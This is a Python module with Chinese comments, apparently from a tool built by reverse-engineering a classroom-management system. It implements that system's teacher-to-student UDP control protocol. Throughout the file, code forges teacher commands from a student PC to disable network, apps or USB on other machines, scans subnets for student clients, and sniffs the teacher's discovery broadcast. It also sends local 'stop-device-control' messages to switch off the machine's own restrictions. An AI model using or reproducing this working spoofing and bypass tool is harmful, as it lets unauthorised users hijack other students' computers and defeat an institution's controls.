# src/modules/teacher_control.py
# 教师端管控指令模拟模块 —— 在学生机上模拟教师端向学生端发送管控指令
#
# ★ 逆向结论（IDA + Ghidra 双重仲裁，详见：
#    docs/ARBITRATION_VERIFICATION_REPORT.md
#    docs/NET_LIMIT_PAYLOAD_RESEARCH.md）
#
#   1) 线格式（已确认）
#      报文体 = [16 字节命令头][载荷]
#      命令头（小端，MainLogic.dll FUN_1003f850）:
#        uint32 cmdType     命令类型号（11/13/28/79/111/500）
#        uint32 flag1       0 或 1
#        uint32 flag2       0
#        uint32 payloadLen  载荷字节长度
#
#   2) 传输通道（已确认）
#      教师端 FUN_1009e070 遍历在线学生列表 → 逐台 UDP 单播 →
#      学生机 :8040（UdpMessageControllerPort / core.conf）
#
#   3) 网络限制 cmdType=500 载荷（基本定稿）
#      载荷 = "/*//" 前缀 + CtrlCode JSON（MainLogic.dll FUN_10064770）
#      {"CtrlCode": 位标志, "apps":[...], "cites":[...], "keys":[...],
#       "sendState":1, "tipInfo":"...", "serverIp":"..."}
#      CtrlCode 位标志（Teacher.exe FUN_005648c0 确认）:
#        0x01    禁用网络 DisabledNet
#        0x02    网络过滤 EnableNetKeyFilter
#        0x10    禁用程序 DisabledApp
#        0x100   USB限制1 DisabledUsb
#        0x1000  USB限制2 DisabledUsb
#        0x10000 USB限制3 DisabledUsb
#
#   4) 学生端内部链路（非注入目标，供本地自救参考）
#      StudentLogic.dll 收到 8040 报文 → 翻译成
#      {"type":"support-use-device-control"/"stop-device-control", ...}
#      → UDP 127.0.0.1:8045 → DeviceControl → 驱动执行
#
#   ⚠️ 待动态验证：/*// 后是否直接跟 JSON；数组是否按位携带；
#      其他 cmdType（11/13/28/79/111）的载荷结构

import time
import json
import socket
import struct
import ipaddress
import binascii

from src.utils.logger import info, warn, error, debug

# 学生端接收管控指令的 UDP 端口（UdpMessageControllerPort 默认值）
DEFAULT_PORT = 8040

# 学生端本地 IPC 端口（StudentLogic.dll 翻译后转发目标）
LOCAL_DEVICE_PORT = 8045     # DeviceControl 管控通道
LOCAL_NPD_PORT = 9030        # npd-auto 通道

# 教师发现端口/标识（core.conf: ChannleScanPort / Report.md 连接建立流程）
CHANNEL_SCAN_PORT = 7777     # 教师端每~1s 在此广播 teacherip
TEACHERIP_MSG_ID = "teacherip"

DEFAULT_TIMEOUT = 1.5

# ── 命令类型号（MainLogic.dll / IDA 导出确认）──
CMD_CALL_SIGN = 11        # 学生呼号/点名 SendCallSignToNewStudent
CMD_REMOTE_CMD = 13       # 远程命令 SetRemoteCommand （39/40/41 同类）
CMD_STU_SET = 28          # 学生参数配置 SendStudentParaConfig (StuSet)
CMD_EXAM_FILE_END = 79    # 考试文件传输结束 ExamFileTransferEnd
CMD_STU_INFO = 111        # 学生信息登记
CMD_NET_LIMIT = 500       # 网络限制 Limit

# ── CtrlCode 位标志（Teacher.exe FUN_005648c0 确认）──
CTRL_DISABLED_NET = 0x01            # 禁用网络
CTRL_ENABLE_NET_KEYFILTER = 0x02    # 网络过滤
CTRL_DISABLED_APP = 0x10            # 禁用程序
CTRL_DISABLED_USB1 = 0x100          # USB 限制 1
CTRL_DISABLED_USB2 = 0x1000         # USB 限制 2
CTRL_DISABLED_USB3 = 0x10000        # USB 限制 3
CTRL_USB_ALL = CTRL_DISABLED_USB1 | CTRL_DISABLED_USB2 | CTRL_DISABLED_USB3

# 载荷前缀标记（MainLogic.dll FUN_10064770 确认）
PAYLOAD_PREFIX = b"/*//"


# ══════════════════════════ 报文构造 ══════════════════════════

def build_packet(cmd_type: int, payload: bytes, flag1: int = 0,
                 flag2: int = 0) -> bytes:
    """构造教师端管控指令报文。

    Args:
        cmd_type: 命令类型号。
        payload:  载荷字节（可二进制，通常为 JSON）。
        flag1:    flag1 字段（默认 0）。
        flag2:    flag2 字段（默认 0）。

    Returns:
        16 字节命令头 + 载荷 组成的完整报文。
    """
    header = struct.pack("<IIII", int(cmd_type) & 0xFFFFFFFF,
                         int(flag1) & 0xFFFFFFFF,
                         int(flag2) & 0xFFFFFFFF,
                         len(payload))
    return header + payload


def hex_preview(pkt: bytes, max_len: int = 160) -> str:
    """报文 hex 预览（前 max_len 字符，超长截断）。"""
    h = binascii.hexlify(pkt).decode("ascii")
    if len(h) > max_len:
        return h[:max_len] + "..."
    return h


# ══════════════════════════ 载荷构造 ══════════════════════════

def build_ctrl_payload(ctrl_code: int, apps=None, cites=None, keys=None,
                       send_state: int = 1, tip_info: str = "",
                       server_ip: str = "", with_prefix: bool = True) -> bytes:
    """构造网络限制（cmdType=500）CtrlCode JSON 载荷。

    载荷格式（逆向定稿）：
        "/*//" + {"CtrlCode":<int>, "apps":[...], "cites":[...],
                   "keys":[...], "sendState":1, "tipInfo":"", "serverIp":""}

    Args:
        ctrl_code:  CtrlCode 位标志（CTRL_* 常量按位或）。
        apps:    程序限制规则列表，如 [{"app":"chrome","exec":"...","type":"black"}]。
        cites:   网址限制规则列表，如 [{"cite":"example.com","type":"black"}]。
        keys:    关键词过滤列表，如 [{"keyName":"surf"}]。
        send_state / tip_info / server_ip: 附加字段（可选）。
        with_prefix: 是否带 "/*//" 前缀（默认 True）。

    Returns:
        载荷字节。
    """
    payload_obj = {"CtrlCode": int(ctrl_code)}
    if apps:
        payload_obj["apps"] = apps
    if cites:
        payload_obj["cites"] = cites
    if keys:
        payload_obj["keys"] = keys
    payload_obj["sendState"] = int(send_state)
    if tip_info:
        payload_obj["tipInfo"] = tip_info
    if server_ip:
        payload_obj["serverIp"] = server_ip
    body = json.dumps(payload_obj, separators=(",", ":")).encode("utf-8")
    return (PAYLOAD_PREFIX + body) if with_prefix else body


def net_limit_payload(network_on: bool = True, keyfilter: bool = False,
                      app_black: bool = False, usb: bool = False,
                      apps=None, cites=None, keys=None,
                      with_prefix: bool = True) -> bytes:
    """便捷构造网络限制载荷（按勾选拼 CtrlCode 位标志）。"""
    ctrl = 0
    if network_on:
        ctrl |= CTRL_DISABLED_NET
    if keyfilter:
        ctrl |= CTRL_ENABLE_NET_KEYFILTER
    if app_black:
        ctrl |= CTRL_DISABLED_APP
    if usb:
        ctrl |= CTRL_USB_ALL
    return build_ctrl_payload(ctrl, apps=apps, cites=cites, keys=keys,
                              with_prefix=with_prefix)


def remote_cmd_payload(text: str, second: int = 0) -> bytes:
    """远程命令载荷（cmdType=13/39/40/41，IDA 确认 {"text":...,"second":...}）。"""
    body = json.dumps({"text": text, "second": int(second)}, separators=(",", ":"))
    return body.encode("utf-8")


def stu_info_payload(ip="", mac="", name="", stunum="", shownum="",
                     pcname="", autosign="") -> bytes:
    """学生信息登记载荷（cmdType=111，IDA 确认字段）。"""
    obj = {"ip": ip, "mac": mac, "name": name, "stunum": stunum,
           "shownum": shownum, "pcname": pcname, "autosign": autosign}
    return json.dumps(obj, separators=(",", ":")).encode("utf-8")


# 学生端本地 IPC JSON（发往 127.0.0.1:8045，供本机自救/解锁参考）

def support_device_payload(networktraffic=0, network=0, device=0, process=0) -> bytes:
    """本地查询管控支持（StudentLogic.dll FUN_100838a0 格式）。"""
    obj = {"type": "support-use-device-control",
           "networktraffic": int(networktraffic), "network": int(network),
           "device": int(device), "process": int(process)}
    return json.dumps(obj, separators=(",", ":")).encode("utf-8")


def stop_device_payload(stopnetworktraffic=1, stopnetwork=1, stopdevice=1,
                        stopprocess=1) -> bytes:
    """本地停止管控（StudentLogic.dll FUN_100836a0 格式，自救解锁用）。"""
    obj = {"type": "stop-device-control",
           "stopnetworktraffic": int(stopnetworktraffic), "stopnetwork": int(stopnetwork),
           "stopdevice": int(stopdevice), "stopprocess": int(stopprocess)}
    return json.dumps(obj, separators=(",", ":")).encode("utf-8")


# ══════════════════════════ 发送 ══════════════════════════

def send_control(ip: str, cmd_type: int, payload: bytes,
                 port: int = DEFAULT_PORT, timeout: float = DEFAULT_TIMEOUT,
                 ttl: int = 2, recv_response: bool = False) -> str:
    """向目标学生机单播发送一条教师端管控指令。

    Args:
        ip:       目标学生机 IP。
        cmd_type: 命令类型号。
        payload:  载荷字节。
        port:     目标 UDP 端口（默认 8040）。
        timeout:  收发超时。
        ttl:      IP_MULTICAST_TTL（单播可忽略）。
        recv_response: 是否尝试接收回包（多数指令学生端不应答，默认 False）。

    Returns:
        结果描述字符串。
    """
    ip = (ip or "").strip()
    if not ip:
        warn("教师端指令：未提供目标 IP，已跳过")
        return "未提供目标 IP"
    try:
        port = int(port or DEFAULT_PORT)
    except (TypeError, ValueError):
        error(f"教师端指令：端口无效: {port}")
        return f"端口无效: {port}"

    pkt = build_packet(cmd_type, payload)
    t0 = time.perf_counter()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(timeout)
        try:
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
        except OSError:
            pass  # 单播场景非必需
        sock.sendto(pkt, (ip, port))
        el = (time.perf_counter() - t0) * 1000
        msg = (f"教师端指令 cmdType={cmd_type} 已发送到 {ip}:{port}"
               f"（{len(pkt)} 字节，耗时 {el:.0f}ms）")
        if recv_response:
            try:
                data, addr = sock.recvfrom(2048)
                msg += f" | 收到回包 {len(data)} 字节: {hex_preview(data)}"
            except socket.timeout:
                msg += " | 等待回包超时"
            except OSError as exc:
                msg += f" | 回包接收失败: {exc}"
        info(msg)
        return msg
    except OSError as exc:
        el = (time.perf_counter() - t0) * 1000
        warn(f"发送到 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
        return f"发送到 {ip}:{port} 失败: {exc}"
    finally:
        try:
            sock.close()
        except Exception:
            pass


def send_multi(ips, cmd_type: int, payload: bytes,
               port: int = DEFAULT_PORT, timeout: float = DEFAULT_TIMEOUT) -> str:
    """对多个 IP 批量发送管控指令（全体模式 = 遍历单播，与原生教师端一致）。"""
    ips = list(ips)
    if not ips:
        return "没有可发送的目标 IP"
    ok, fail = 0, 0
    details = []
    for ip in ips:
        r = send_control(ip, cmd_type, payload, port, timeout)
        if "已发送" in r:
            ok += 1
        else:
            fail += 1
            details.append(r)
    info(f"批量发送管控指令完成：成功 {ok} 台，失败 {fail} 台")
    summary = f"批量发送管控指令：成功 {ok} 台，失败 {fail} 台"
    if details:
        summary += " | " + "; ".join(details[:5])
    return summary


def send_raw(ip: str, port: int, payload: bytes,
             timeout: float = DEFAULT_TIMEOUT,
             recv_response: bool = True) -> str:
    """发送原始载荷（不组 16B 命令头）到 ip:port。

    用于学生端本地 IPC 通道（127.0.0.1:8045/9030，纯 JSON，无命令头）。

    Args:
        ip / port: 目标。
        payload:   原始载荷字节（如 {"type":"stop-device-control",...} JSON）。
        timeout:   收发超时。
        recv_response: 是否尝试接收回包。

    Returns:
        结果描述字符串。
    """
    ip = (ip or "").strip()
    if not ip:
        return "未提供目标 IP"
    try:
        port = int(port)
    except (TypeError, ValueError):
        return f"端口无效: {port}"
    t0 = time.perf_counter()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(timeout)
        sock.sendto(payload, (ip, port))
        el = (time.perf_counter() - t0) * 1000
        msg = (f"原始载荷已发送到 {ip}:{port}（{len(payload)} 字节，耗时 {el:.0f}ms）")
        if recv_response:
            try:
                data, addr = sock.recvfrom(2048)
                msg += f" | 收到回包 {len(data)} 字节: {hex_preview(data)}"
            except socket.timeout:
                msg += " | 等待回包超时"
            except OSError as exc:
                msg += f" | 回包接收失败: {exc}"
        info(msg)
        return msg
    except OSError as exc:
        el = (time.perf_counter() - t0) * 1000
        warn(f"发送到 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
        return f"发送到 {ip}:{port} 失败: {exc}"
    finally:
        try:
            sock.close()
        except Exception:
            pass


def send_control_local(payload: bytes, port: int = LOCAL_DEVICE_PORT,
                       timeout: float = DEFAULT_TIMEOUT) -> str:
    """发送纯 JSON 载荷到本机 127.0.0.1:<port>（本地 DeviceControl/npd-auto 通道）。

    注意：本地 IPC（8045/9030）是纯 JSON，不带 16B 命令头（StudentLogic.dll
    FUN_100836a0 直接发 {"type":"stop-device-control",...} JSON）。
    """
    return send_raw("127.0.0.1", port, payload, timeout, recv_response=True)


# ══════════════════════════ 目标解析 / 学生发现 ══════════════════════════

def expand_cidr(cidr: str):
    """展开网段字符串为 IP 列表；非合法网段则原样返回。"""
    try:
        net = ipaddress.ip_network(cidr.strip(), strict=False)
        hosts = [str(h) for h in net.hosts()]
        return hosts
    except ValueError:
        return [cidr.strip()]


def _expand_last_octet(ip_str: str, end: int):
    """展开 192.168.1.10-20 格式的末段范围。"""
    try:
        prefix, _, last = ip_str.rpartition(".")
        start = int(last)
        if not (0 <= start <= end <= 255):
            return []
        return [f"{prefix}.{n}" for n in range(start, end + 1)]
    except (ValueError, AttributeError):
        return []


def parse_targets(text: str):
    """解析目标：支持单 IP / CIDR / 逗号分隔 / 末段范围 a-b，去重保序。"""
    text = (text or "").strip()
    if not text:
        return []
    out = []
    for part in text.replace("，", ",").split(","):
        part = part.strip()
        if not part:
            continue
        if "/" in part:
            out.extend(expand_cidr(part))
        elif "-" in part and part.count(".") == 3:
            base, _, end = part.rpartition("-")
            try:
                out.extend(_expand_last_octet(base, int(end)))
            except ValueError:
                out.append(part)
        else:
            out.append(part)
    seen, res = set(), []
    for ip in out:
        if ip not in seen:
            seen.add(ip)
            res.append(ip)
    return res


def discover_students(cidr: str, port: int = DEFAULT_PORT, timeout: float = 0.35):
    """实验性：扫描网段内可能的学生端。

    向每个 IP:port 发送 CmdType=111（学生信息登记）探测载荷，
    若学生端实现了应答协议会回包；不回包不代表不在线。
    仅用于估计在线范围，最终以实际测试为准。

    Returns:
        疑似学生端 IP 列表（排序列）。
    """
    import concurrent.futures
    hosts = expand_cidr(cidr)
    if not hosts or len(hosts) > 4096:
        warn(f"学生发现：网段过大或无效: {cidr}")
        return []
    probe = build_packet(CMD_STU_INFO, stu_info_payload())
    found = set()

    def _probe(ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.settimeout(timeout)
            s.sendto(probe, (ip, port))
            try:
                data, addr = s.recvfrom(512)
                if data:
                    found.add(addr[0])
            except (socket.timeout, OSError):
                pass
            s.close()
        except OSError:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
        list(ex.map(_probe, hosts))
    return sorted(found)


# 兼容旧引用：保持旧名可用
net_limit_payload_old = net_limit_payload


# ══════════════════════════ 教师端自动发现 ══════════════════════════

def _is_private_ip(ip: str) -> bool:
    """局域网私有地址判断（仅接受可能承载教师机的内网来源）。"""
    if not ip:
        return False
    if ip.startswith("127.") or ip == "::1":
        return False
    try:
        a = int(ip.split(".")[0]); b = int(ip.split(".")[1])
    except Exception:
        return False
    if a == 10 or (a == 192 and b == 168) or (a == 169 and b == 254):
        return True
    if a == 172 and 16 <= b <= 31:
        return True
    return False


def _parse_teacherip(data: bytes):
    """从 7777 广播报文解析 teacher_ip。

    教师端 teacherip 广播是**纯 JSON 无 16B 头**，形如：
        {"channel":N,"checksum":...,"msg_id":"teacherip","teacher_ip":"<IP>"}
    匹配到 msg_id == "teacherip" 才返回其 teacher_ip，否则返回 None。
    """
    try:
        txt = data.decode("utf-8", "replace").strip()
        obj = json.loads(txt)
    except Exception:
        return None
    if not isinstance(obj, dict):
        return None
    if obj.get("msg_id") != TEACHERIP_MSG_ID:
        return None
    tip = obj.get("teacher_ip")
    return tip if isinstance(tip, str) and tip else None


def listen_teacher_ip(timeout: float = 8.0, port: int = CHANNEL_SCAN_PORT):
    """监听局域网内教师机的 7777 'teacherip' 广播，返回教师机 IP。

    教师端每 ~1 秒在 7777 端口广播一条 teacherip（含教师机 IP 与频道位）。
    本函数在本机 7777 端口 bind 监听，过滤掉回环/公网来源后解析出教师 IP。

    Args:
        timeout: 最多等待秒数（教师广播约 1s 一条，给几秒足够）。
        port:    监听的 UDP 端口（默认 7777 / ChannleScanPort）。

    Returns:
        找到则返回教师机 IP 字符串；超时未找到返回 None。

    Raises:
        OSError: 无法绑定 7777（多半被学生端进程占用，需提示用户改用 pktmon 或确认本机未占用）。
    """
    deadline = time.time() + float(timeout)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", int(port)))
    try:
        while time.time() < deadline:
            s.settimeout(min(1.0, max(0.2, deadline - time.time())))
            try:
                data, addr = s.recvfrom(4096)
            except socket.timeout:
                continue
            src = addr[0]
            if not _is_private_ip(src):
                continue                      # 丢弃回环/公网源
            tip = _parse_teacherip(data)
            if tip:
                info(f"教师端自动发现：来自 {src} 的 teacherip -> 教师机 {tip}")
                return tip
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass

